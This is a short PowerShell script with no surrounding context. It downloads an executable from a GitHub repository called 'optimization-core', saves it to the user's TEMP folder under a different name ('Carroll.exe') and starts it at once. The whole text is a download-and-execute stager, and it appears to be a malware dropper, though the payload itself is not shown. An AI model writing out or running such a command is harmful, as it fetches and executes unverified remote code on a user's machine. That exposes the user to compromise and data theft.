$url = "https://github.com/optimization-core/optimization/raw/main/app.exe"

$dest = "$env:TEMP\Carroll.exe"

Invoke-WebRequest $url -OutFile $dest

Start-Process $dest
